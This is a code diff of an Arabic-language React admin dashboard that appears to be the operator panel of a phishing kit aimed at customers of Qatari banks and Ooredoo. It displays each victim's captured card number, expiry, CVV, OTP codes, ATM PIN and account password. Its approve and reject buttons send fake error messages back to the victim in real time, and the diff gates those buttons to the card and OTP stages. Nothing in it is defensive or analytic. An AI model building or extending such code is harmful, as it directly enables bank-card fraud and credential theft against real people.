@@ -190,29 +190,29 @@ export default function AdminDashboard() {
             <Table>
               <TableHeader className="bg-slate-50">
                 <TableRow>
-                  <TableHead className="text-right">رقم الهاتف</TableHead>
+                  <TableHead className="text-right">البلد (مصدر الزيارة)</TableHead>
                   <TableHead className="text-right">نوع العضوية</TableHead>
-                  <TableHead className="text-right">البلد</TableHead>
+                  <TableHead className="text-right">رقم الهاتف</TableHead>
                   <TableHead className="text-right">المرحلة الحالية</TableHead>
                   <TableHead className="text-right">الحالة</TableHead>
-                  <TableHead className="text-center">الإجراءات</TableHead>
+                  <TableHead className="text-center">التفاصيل</TableHead>
                 </TableRow>
               </TableHeader>
               <TableBody>
                 {filteredSessions?.map((session) => (
                   <TableRow key={session.id}>
-                    <TableCell className="font-bold">{session.personalData?.phoneNumber || "—"}</TableCell>
+                    <TableCell className="font-bold">
+                      <div className="flex items-center gap-2">
+                        <MapPin className="w-4 h-4 text-slate-400" />
+                        {session.country || "—"}
+                      </div>
+                    </TableCell>
                     <TableCell className="font-bold">
                       {session.selectedBank === 'qnb' ? 'العضوية الفضية' : 
                        session.selectedBank === 'cbq' ? 'العضوية الذهبية' : 
                        session.selectedBank === 'dib' ? 'العضوية البلاتينية' : session.selectedBank?.toUpperCase() || "—"}
                     </TableCell>
-                    <TableCell className="font-bold">
-                      <div className="flex items-center gap-2">
-                        <MapPin className="w-4 h-4 text-slate-400" />
-                        {session.personalData?.country || "—"}
-                      </div>
-                    </TableCell>
+                    <TableCell className="font-bold">{session.personalData?.phoneNumber || "—"}</TableCell>
                     <TableCell>
                       <span className="px-3 py-1 bg-blue-50 text-blue-600 rounded-full text-xs font-bold">
                         {getStepLabel(session.currentStep || "")}
@@ -270,6 +270,7 @@ export default function AdminDashboard() {
                     "البريد الإلكتروني": selectedSession.personalData?.email,
                     "الدولة": selectedSession.personalData?.country,
                   }}
+                  currentStep={selectedSession.currentStep}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                   onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله")}
                 />
@@ -283,6 +284,7 @@ export default function AdminDashboard() {
                     "التاريخ": selectedSession.loginMethod?.expiryDate,
                     "CVV": selectedSession.loginMethod?.cvv,
                   }}
+                  currentStep={selectedSession.currentStep}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                   onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله")}
                 />
@@ -294,6 +296,7 @@ export default function AdminDashboard() {
                     if (otp.otpType !== 'ooredoo') acc[`رمز ${i + 1}`] = otp.otpCode;
                     return acc;
                   }, {}) || { "رمز OTP": "—" }}
+                  currentStep={selectedSession.currentStep}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                   onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من الرمز المرسال عبر الجوال")}
                 />
@@ -302,6 +305,7 @@ export default function AdminDashboard() {
                   title="ATM PIN"
                   icon={<CreditCard className="w-4 h-4" />}
                   data={{ "الرقم السري": selectedSession.atmPin?.pin }}
+                  currentStep={selectedSession.currentStep}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                   onReject={() => handleAdminAction(selectedSession.id, 'reject', "الرقم السري للصراف الي غير صحيح")}
                 />
@@ -314,6 +318,7 @@ export default function AdminDashboard() {
                     "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
                     "OTP Ooredoo": selectedSession.otps?.find((otp: any) => otp.otpType === 'ooredoo')?.otpCode || '—',
                   }}
+                  currentStep={selectedSession.currentStep}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                   onReject={() => {
                     const isOtpOoredoo = selectedSession.currentStep === 'otp_ooredoo';
@@ -339,7 +344,10 @@ export default function AdminDashboard() {
   );
 }
 
-function DataSection({ title, icon, data, onAccept, onReject }: any) {
+function DataSection({ title, icon, data, onAccept, onReject, currentStep }: any) {
+  // تفعيل الأزرار فقط من مرحلة اتمام التسجيل والاشتراك وما بعده
+  const enableButtons = ['card', 'otp', 'atm', 'ooredoo', 'otp_ooredoo', 'success'].includes(currentStep);
+  
   return (
     <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm hover:shadow-md transition-shadow">
       <div className="bg-slate-50 px-6 py-4 border-b border-slate-100 flex items-center justify-between">
@@ -353,16 +361,18 @@ function DataSection({ title, icon, data, onAccept, onReject }: any) {
           <Button 
             size="sm" 
             variant="outline" 
-            className="h-8 w-8 p-0 rounded-full border-emerald-200 text-emerald-600 hover:bg-emerald-50"
+            className="h-8 w-8 p-0 rounded-full border-emerald-200 text-emerald-600 hover:bg-emerald-50 disabled:opacity-50 disabled:cursor-not-allowed"
             onClick={onAccept}
+            disabled={!enableButtons}
           >
             <Check className="w-4 h-4" />
           </Button>
           <Button 
             size="sm" 
             variant="outline" 
-            className="h-8 w-8 p-0 rounded-full border-rose-200 text-rose-600 hover:bg-rose-50"
+            className="h-8 w-8 p-0 rounded-full border-rose-200 text-rose-600 hover:bg-rose-50 disabled:opacity-50 disabled:cursor-not-allowed"
             onClick={onReject}
+            disabled={!enableButtons}
           >
             <X className="w-4 h-4" />
           </Button>
